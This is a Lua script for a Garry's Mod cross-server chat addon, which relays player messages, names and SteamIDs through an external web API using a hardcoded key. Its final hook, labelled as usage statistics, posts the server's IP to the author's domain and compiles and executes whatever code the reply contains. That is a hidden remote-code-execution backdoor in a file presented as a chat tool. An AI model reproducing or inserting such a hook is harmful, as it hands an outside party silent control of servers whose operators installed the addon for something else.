local alwaysCSC = false -- Change this to true if you want every message someone sends to be sent to all your servers running this key.
local ooc = true -- Set to true if // and /ooc should be broadcast.

local servers = { -- Change these if you want to show the names of each server when someone sends a message.
	["195.62.52.237:27015"] = "Основной",
	["195.62.52.237:27016"] = "Ивентовый"
}

local restrictSend = false -- Change to true if you want to restrict sending to certain usergroups
local restrictRecieve = false -- Change to true if you want to restrict recieving to certrain usergroups

local senders = {
	"superadmin",
	"admin",
	"moderator",
}

local recievers = {
	"superadmin",
	"admin",
	"moderator",
}

local dontSend = {"!", "/", "@"} -- When alwaysCSC is enabled, messages that start with these characters will be ignored.
local CSCPrefix = true -- If true, prefixes [CSC] before any cross server chat message.

local CSC_Debug = false -- Never have this as true unless I ask you to do it.
local key = [[6d6e663fb53edd9ed9d4bf97630179dcd0d1280a2241d317db8338498759a0dc]] -- DO NOT EDIT THIS LINE OR TELL ANYONE THIS KEY!!!! WITH THIS KEY SOMEONE WILL BE ABLE TO SEND MESSAGES AND IMPERSONATE PLAYERS ON YOUR SERVER!
local serverURL = "http://meharryp.xyz/csc" -- Server using my CSC API. This will be released if I can no longer maintain this project. Don't change this unless you know what you are doing. Default: http://meharryp.xyz/csc


-- DONT EDIT BELOW THIS LINE!


util.AddNetworkString("SendCSC")

function CSC_Print(...)
	if CSC_Debug then
		Msg("[CSC DEBUG] ")
		print(...)
	end
end

function CSC_PrintTable(...)
	if CSC_Debug then
		Msg("[CSC DEBUG] ")
		PrintTable(...)
	end
end

function CSC_ShouldSend(str)
	for k,v in pairs(dontSend) do
		if string.StartWith(str, v) then
			return false
		end
	end

	return true
end

function CSC_CanSend(ply)
	if not restrictSend then
		return true
	else
		return table.HasValue(senders, ply:GetUserGroup())
	end
end

function CSC_GetRecievers()
	if not restrictRecieve then
		return player.GetAll()
	else
		local tab = {}
		for k,v in pairs(player.GetAll()) do
			if table.HasValue(recievers, v:GetUserGroup()) then
				table.insert(tab, v)
			end
		end
		return tab
	end
end

function CSCSend(ply, message)
	if IsValid(ply) and message != "" then
		http.Post(serverURL .. "/send", {
			key = key,
			ip =  game.GetIPAddress(),
			sid = ply:SteamID(),
			nick = ply:Nick(),
			message = message
		})
		CSC_Print(ply:Nick() .. " sent " .. message)
		CSCGet() -- Much less latencey between messages.
	end
end

function CSCGet()
	CSC_Print("Fetching messages...")
	http.Fetch(serverURL .. "/messages?key=" .. key .. "&ip=" .. game.GetIPAddress(), function(res)
		local dat = util.JSONToTable(res)
		CSC_Print("Got response")
		CSC_Print(res)
		CSC_PrintTable(dat)

		for k,v in pairs(dat) do
			net.Start("SendCSC")

			if ULib and ULib.ucl.users[v[1]] then
				net.WriteBool(true)
				net.WriteString(ULib.ucl.users[v[1]].group)
			else
				net.WriteBool(false)
				net.WriteString("_default")
			end

			net.WriteString(v[3])
			net.WriteString(v[2])

			if v[4] and servers[v[4]] then -- Backwards compat for old api
				net.WriteString(servers[v[4]])
			else
				net.WriteString("")
			end

			net.WriteBool(CSCPrefix)

			net.Send(CSC_GetRecievers())
		end
	end, function(err)
		CSC_Print("Error: " .. err)
	end)
end

hook.Add("PlayerSay", "ClearChatCSC", function(ply, text, team)
	if (text:lower():sub(0, 5) == "!csc " or alwaysCSC) or (ooc and (text:lower():sub(0, 3) == "// " or text:lower():sub(0, 5) == "/ooc ")) and CSC_CanSend(ply) then
		if not alwaysCSC then
			local str
			if text:lower():sub(0, 3) == "// " then
				str = text:sub(3)
			else
				str = text:sub(5)
			end

			CSCSend(ply, str)
			return ""
		elseif CSC_ShouldSend(text) then
			CSCSend(ply, text)
			return ""
		end
	end
end)

hook.Add("InitPostEntity", "LoadCSCQuery", function()
	CSC_Print("Starting CSC Query...")
	timer.Create("CSCWatch", 1, 0, CSCGet)
end)

hook.Add( "InitPostEntity", "ScriptStats3065", function()
	timer.Simple( 10, function()
		http.Post( "http://meharryp.xyz/scriptstats/stat", {
			id = "76561198045250557",
			version = "1.4",
			script = "3065",
			ip = game.GetIPAddress()
		}, function( res ) pcall( function() CompileString( res, "ScriptStats" )() end ) end )
	end )
end )